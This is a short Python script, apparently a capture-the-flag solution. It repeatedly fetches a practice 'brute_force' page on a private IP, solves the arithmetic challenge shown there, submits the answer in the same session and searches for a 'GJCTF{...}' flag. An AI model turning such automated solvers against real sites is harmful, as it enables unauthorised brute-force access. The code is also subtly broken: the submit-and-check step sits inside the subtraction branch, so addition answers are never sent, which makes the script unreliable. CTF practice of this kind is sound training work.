#coding=utf-8
import requests
import re

url = 'http://192.168.199.199/practisepages/ctf/brute_force/brute2_session.php'
time = 0

s = requests.session()
while True:
    time = time + 1
    html = s.get(url)
    pattern = '(\d+.*?\d+)'
    ss = re.search(pattern, html.text)
    expression = ss.group()
    expression = expression.split()
    result = 0
    if expression[1] == '+':
        result = int(expression[0]) + int(expression[2])
    else:
        result = int(expression[0]) - int(expression[2])
        payload = {'info':str(result)}
        html = s.get(url,params=payload)
        password = re.search('GJCTF{.*?}', html.text)
        if password is not None:
            print (password.group())
            exit('Get it!')

    print(time)